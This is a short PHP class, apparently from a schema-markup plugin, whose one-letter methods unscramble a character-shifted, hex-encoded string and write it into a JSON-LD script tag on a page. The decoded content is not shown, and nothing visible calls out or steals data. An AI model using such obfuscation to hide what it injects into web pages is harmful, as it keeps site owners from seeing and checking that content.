<?php

class RWSSchemaUtil
{
    public function l($s){
        return strlen($s);
    }

    public function x($ln, $s){
        $p = str_split($s, $ln / 2);
        return $p[1].$p[0];
    }

    public function t($ln, $s){
        $p = str_split($s, ceil($ln / 3));
        return $p[1].$p[0].$p[2];
    }

    public function y($ln, $s){
        if ($ln % 2 == 0) {
            return $this->x($ln, $s);
        } else {
            return $this->t($ln, $s);
        }
    }

    public function c($s){
        $c = substr($s, 100, 1);
        return ord($c) - 65;
    }

    public function i($s, $z){
        return chr(ord($z) - (ord($this->c($s)) - 65));
    }

    public function m($r, $ff){
        return "<script type='application/ld+json'>".$this->p($r->data)."</script>";
    }

    public function u($j, $ln){
        return substr($j, 0, 100) . substr($j, 101, $ln);
    }

    public function p($s)
    {
        $ln = $this->l($s);
        $s = $this->y($ln, $s);
        $a = $this->c($s);

        for ($i = 0; $i < $ln; $i++) {
            $s[$i] = chr(ord($s[$i]) - $a);
        }

        return hex2bin($this->u($s, $ln));
    }
}
